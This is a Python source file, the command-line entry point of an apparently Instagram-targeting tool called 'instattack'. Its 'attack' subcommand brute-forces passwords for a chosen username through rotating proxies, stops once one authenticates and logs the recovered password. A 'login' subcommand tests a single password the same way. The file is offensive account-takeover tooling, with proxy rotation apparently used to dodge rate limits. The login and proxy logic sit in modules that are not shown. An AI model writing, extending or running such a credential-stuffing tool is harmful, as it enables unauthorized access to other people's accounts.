from argparse import ArgumentTypeError
import asyncio
from platform import python_version
from plumbum import cli
import tortoise

from instattack import logger
from instattack.exceptions import ArgumentError
from instattack.conf import Configuration

from .users.models import User
from .login.handler import LoginHandler
from .proxies.handler import ProxyHandler


def post_handlers(user, config):

    lock = asyncio.Lock()
    start_event = asyncio.Event()
    auth_result_found = asyncio.Event()

    proxy_handler = ProxyHandler(
        config['proxies'],
        lock=lock,
        start_event=start_event,
    )

    password_handler = LoginHandler(
        config['login'],
        proxy_handler,
        user=user,
        start_event=start_event,
        stop_event=auth_result_found,
    )
    return proxy_handler, password_handler


class BaseApplication(cli.Application):
    """
    Used so that we can easily extend Instattack without having to worry about
    overriding the main method.
    """

    def config(self):
        return Configuration.load()

    def get_user(self, loop, username):

        async def _get_user(username):
            log = logger.get_async(__name__, subname='get_user')

            try:
                user = await User.get(username=username)
            except tortoise.exceptions.DoesNotExist:
                await log.error(f'User {username} does not exist.')
                return None
            else:
                user.setup()
                return user

        return loop.run_until_complete(_get_user(username))

    async def check_if_user_exists(self, username):
        try:
            user = await User.get(username=username)
        except tortoise.exceptions.DoesNotExist:
            return None
        else:
            return user


class SelectOperatorApplication(BaseApplication):

    def main(self, *args):
        loop = asyncio.get_event_loop()
        operator = self.get_operator(*args)
        loop.run_until_complete(operator(loop))
        return 1

    def get_operator(self, *args):
        if len(args) == 0:
            if not hasattr(self, 'operation'):
                raise ArgumentError('Missing positional argument.')
            return self.operation
        else:
            method_name = args[0]
            if not hasattr(self, method_name):
                raise ArgumentError('Invalid positional argument.')

            return getattr(self, method_name)


class EntryPoint(BaseApplication):

    def main(self, *args):
        self.validate(*args)

    def validate(self, *args):
        if int(python_version()[0]) < 3:
            raise EnvironmentError('Please use Python 3')

        if args:
            raise ArgumentTypeError("Unknown command %r" % (args[0]))

        # The nested command will be`None if no sub-command follows
        if not self.nested_command:
            raise ArgumentTypeError("No command given")


@EntryPoint.subcommand('login')
class Login(BaseApplication):

    __name__ = 'Login'

    collect = cli.Flag("--collect", default=False)

    def main(self, username, password):
        log = logger.get_sync(__name__, subname='main')

        # Default Collect to False
        config = self.config()
        config.update({'proxies': {'pool': {'collect': self.collect}}})

        loop = asyncio.get_event_loop()

        user = self.get_user(loop, username)
        if not user:
            return

        result = loop.run_until_complete(self.test_login(
            loop, user, password, config
        ))
        log.complete(str(result))
        return 1

    async def test_login(self, loop, user, password, config):
        log = logger.get_async(__name__, subname='test_login')

        proxy_handler, password_handler = post_handlers(user, config)

        results = await asyncio.gather(
            password_handler.attempt_single_login(loop, password),
            proxy_handler.run(loop),
        )

        # We might not need to stop proxy handler.
        await log.debug('Stopping Proxy Handler...')
        await proxy_handler.stop(loop)

        await log.debug('Returning Result')
        return results[0]


@EntryPoint.subcommand('attack')
class Attack(BaseApplication):

    __name__ = 'Run Attack'

    # Overrides Password Limit Set in Configuration File
    limit = cli.SwitchAttr("--limit", int, mandatory=False,
        help="Limit the number of passwords to perform the attack with.")

    # Overrides Collect Flag Set in Configuration File
    collect = cli.Flag("--collect", default=False,
        help="Enable simultaneous proxy collection with Proxy Broker package.")

    def main(self, username):
        """
        Iteratively tries each password for the given user with the provided
        token until a successful response is achieved for each password or
        a successful authenticated response is achieved for any password.

        We cannot perform any actions in finally because if we hit an exception,
        the loop will have been shutdown by that point.

        Proxies will not be saved if it wasn't started, but that is probably
        desired behavior.
        """
        log = logger.get_sync(__name__, subname='main')

        # Default Collect to False
        config = self.config()
        config.update({'proxies': {'pool': {'collect': self.collect}}})

        # Override Password Limit if Set
        if self.limit:
            config.update({'login': {'limit': self.limit}})

        loop = asyncio.get_event_loop()

        user = self.get_user(loop, username)
        if not user:
            return

        # Result will only return if it is authorized.
        results = self.attack(loop, user, config)
        if results.has_authenticated:

            # This log right here is causing an error for an unknown reason...
            log.success(f'Authenticated {username}!', extra={
                'password': results.authenticated_result.password
            })
        else:
            log.error(f'User {username} Not Authenticated.')

    def attack(self, loop, user, config):

        async def _attack(loop, user, config):
            log = logger.get_async(__name__, subname='attack')

            proxy_handler, password_handler = post_handlers(user, config)

            results = await asyncio.gather(
                password_handler.run(loop),
                proxy_handler.run(loop),
            )

            # We might not need to stop proxy handler.
            await log.debug('Stopping Proxy Handler...')
            await proxy_handler.stop(loop)

            await log.debug('Returning Result')
            return results[0]

        return loop.run_until_complete(_attack(loop, user, config))
